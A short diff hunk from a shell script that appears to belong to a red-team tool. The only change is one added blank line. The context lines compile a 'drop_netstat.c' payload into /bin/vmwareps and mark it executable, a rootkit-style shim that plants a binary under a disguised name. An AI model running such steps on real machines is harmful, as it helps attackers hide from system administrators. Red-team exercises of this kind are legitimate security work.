@@ -161,6 +161,7 @@ shim_ps(){
 # Need to add a shim for netstat 
 shim_netstat() {
 	echo -e "\nShimming netstat... \n"
+
 	gcc /opt/cdt-redteamtool/payload/netstat/drop_netstat.c -o /bin/vmwareps
 	chmod 755 /bin/vmwareps
 
